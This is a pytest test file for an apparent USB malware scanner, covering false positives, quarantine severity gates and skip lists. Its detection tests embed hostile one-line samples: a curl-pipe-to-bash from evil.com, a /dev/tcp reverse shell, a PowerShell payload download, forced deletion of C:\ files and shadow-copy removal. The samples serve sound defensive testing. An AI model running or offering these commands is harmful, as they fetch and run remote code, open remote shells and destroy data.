"""
test_false_positives.py — Guards the detection engine's precision.

Every case here maps to a real failure mode: before the two-tier pattern
model, a single weak keyword flagged a file, and scanner.py quarantined at
*any* severity. Together that meant an ordinary Python file containing
"import os" was encrypted and its original deleted.
"""

import pytest

from signatures import match_file, should_skip_path, MIN_PATTERN_MATCHES
from threat_intel import enrich_tag
from scanner import QUARANTINE_SEVERITY_THRESHOLD


def write(tmp_path, name, content):
    p = tmp_path / name
    p.write_text(content)
    return str(p)


class TestBenignFilesAreNotFlagged:
    """Files tripping exactly one weak keyword must come back clean."""

    @pytest.mark.parametrize("name,content", [
        ("helper.py", "import os\nimport sys\nprint(os.getcwd())\n"),
        ("notes.txt", "Ask IT about the powershell execution policy.\n"),
        ("build.bat", "@echo off\nnet user\n"),
        ("setup.py", "from setuptools import setup\nsetup(name='x')\n"),
        ("readme.md", "Run cmd.exe to open a prompt.\n"),
        ("config.ps1", "Start-Process notepad\n"),
        ("deploy.sh", "#!/bin/sh\necho deploying\n"),
    ])
    def test_single_weak_keyword_is_not_enough(self, tmp_path, name, content):
        detected, tags = match_file(write(tmp_path, name, content))
        assert detected is False, f"{name} was flagged with {tags}"

    def test_plain_text_mentioning_powershell_is_clean(self, tmp_path):
        """
        .txt was removed from the HTML rule: a text file mentioning
        "powershell" scored severity 8 and got quarantined.
        """
        path = write(tmp_path, "memo.txt",
                     "<script> powershell cmd.exe base64, all in one memo\n")
        detected, _ = match_file(path)
        assert detected is False


class TestMaliciousFilesStillDetected:
    """Precision must not have cost us recall."""

    @pytest.mark.parametrize("name,content,expected_tag", [
        ("evil.html", "<html><script>powershell -enc AAA</script></html>",
         "Suspicious_HTML_Executable"),
        ("dropper.ps1", "Invoke-WebRequest -Uri http://e.com/p.exe -OutFile p.exe",
         "Suspicious_PowerShell_Script"),
        ("wiper.bat", "@echo off\ndel /f /q C:\\important\\*\n",
         "Suspicious_Batch_Script"),
        ("shadow.bat", "vssadmin delete shadows /all /quiet\n",
         "Suspicious_Batch_Script"),
        ("drop.vbs", 'Set o = CreateObject("WScript.Shell")\no.Run "calc"\n',
         "Suspicious_VBS_Script"),
        ("pipe.sh", "curl -sL http://evil.com/i.sh | sudo bash\n",
         "Suspicious_Shell_Script"),
        ("rev.sh", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
         "Suspicious_Shell_Script"),
    ])
    def test_detects_real_threats(self, tmp_path, name, content, expected_tag):
        detected, tags = match_file(write(tmp_path, name, content))
        assert detected is True, f"{name} was missed"
        assert expected_tag in tags

    def test_regex_catches_forced_delete_regardless_of_flag_order(self, tmp_path):
        """
        Substring matching could not express "forced delete of an absolute
        path": 'del /f /q c:\\' contains 'del /f' but not 'del /q'.
        """
        for variant in ("del /f /q C:\\x\\*", "del /q /f C:\\x\\*", "del /s C:\\x"):
            detected, tags = match_file(write(tmp_path, "w.bat", variant + "\n"))
            assert detected is True, f"missed: {variant}"


class TestQuarantineGate:
    def test_threshold_matches_across_engines(self):
        """scanner, watcher and the portable engine must agree."""
        import watcher
        assert QUARANTINE_SEVERITY_THRESHOLD == watcher.QUARANTINE_SEVERITY_THRESHOLD == 8

    def test_low_severity_findings_are_below_the_gate(self):
        """
        Severity-7 heuristics report but must never destroy a file, since a
        heuristic hit is a guess and quarantine deletes the original.
        """
        for tag in ("Potential_Malicious_Python", "Suspicious_Shell_Script"):
            info = enrich_tag(tag)
            assert info["severity"] < QUARANTINE_SEVERITY_THRESHOLD

    def test_hash_matches_are_above_the_gate(self):
        for tag in ("Known_Malware_Hash", "EICAR_SHA256"):
            assert enrich_tag(tag)["severity"] >= QUARANTINE_SEVERITY_THRESHOLD

    def test_every_rule_tag_has_threat_intel(self):
        """A rule with no intel entry silently degrades to severity 1."""
        from signatures import load_signatures
        from threat_intel import THREAT_INTEL

        for rule in load_signatures()["rules"]:
            assert rule["name"] in THREAT_INTEL, f"{rule['name']} has no intel entry"


class TestSkipLists:
    @pytest.mark.parametrize("path", [
        "/media/usb/node_modules/pkg/index.js",
        "/media/usb/.git/hooks/pre-commit",
        "/media/usb/__pycache__/mod.pyc",
        "/media/usb/System Volume Information/tracking.log",
        "/media/usb/quarantine/abc.qfile",
    ])
    def test_noise_directories_skipped(self, path):
        assert should_skip_path(path) is True

    @pytest.mark.parametrize("path", [
        "/media/usb/movie.mp4",
        "/media/usb/backup.iso",
        "/media/usb/archive.zip",
        "/media/usb/photo.jpg",
    ])
    def test_binary_extensions_skipped(self, path):
        assert should_skip_path(path) is True

    def test_real_scripts_not_skipped(self):
        assert should_skip_path("/media/usb/payload.ps1") is False

    def test_min_pattern_matches_is_meaningful(self):
        assert MIN_PATTERN_MATCHES >= 2
